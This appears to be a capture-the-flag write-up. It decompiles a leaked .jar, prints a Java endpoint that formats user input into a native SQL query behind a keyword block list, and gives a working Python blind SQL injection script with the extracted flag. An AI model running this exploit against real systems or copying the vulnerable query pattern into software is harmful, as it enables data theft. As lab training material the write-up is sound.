# Solution

This challenge contains two hidden endpoints (can be easily detected by scanner or crawler):
- `robots.txt` (points to `/backup`)
- `backup` (contains a backup `.jar` file)

The given `.jar` file is then decompiled with any tool to reveal the source code. In the source code there is this method:
```java
@GetMapping("/model/{model}")
public ResponseEntity getByManufacturer(@PathVariable("model") String model) {
	ResponseEntity response;
	try {
	    List<String> keywords = Arrays.asList(
		    "UNION", "INSERT", "SHOW", "BACKUP", "ALTER", "TRUNCATE", "WITH", "CALL",
		    "INTERSECT", "SELECT", "CREATE", "FROM", "DROP", "DELETE", "JOIN", ";", "\\", "\""
	    );
	    for(String keyword : keywords) {
		if(model.toUpperCase().contains(keyword)) {
		    throw new NoResultException();
		}
	    }
	    String query = String.format("SELECT * FROM CARS WHERE MODEL = '%s' LIMIT 1", model);
	    CarModel car = (CarModel) entityManager.createNativeQuery(query, CarModel.class).getSingleResult();
	    response = new ResponseEntity<>(car, HttpStatus.OK);
	} catch(NoResultException e) {
	    response = new ResponseEntity<>(HttpStatus.NOT_FOUND);
	} catch(Exception e) {
	    response = new ResponseEntity<>(HttpStatus.INTERNAL_SERVER_ERROR);
	}
	return response;
}
```

The method is vulnerable to blind SQL injection which just needs to be scripted. The following script should work:

```python
import requests
import sys

ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUWVXYZ0123456789_-{}"
flag = ''
for i in range(1, 100):
	for j in ALPHABET:
		req = "http://localhost:8080/cars/model/' OR CASEWHEN(SUBSTRING(SECRET,{},1) = '{}',1,0)--}}".format(i, j)
		#print(req)
		resp = requests.get(req)
		if resp.status_code == 200:
			flag += j
			if j == '}':
				print(flag)
				sys.exit(0)
			break
```

```sh
$ python3 solve.py 
ibctf{sqli_sw4p_f13lds-GZ-2}
```

The script will also work in a variant where `CASEWHEN` is not removed and only `SUBSTRING` is used.
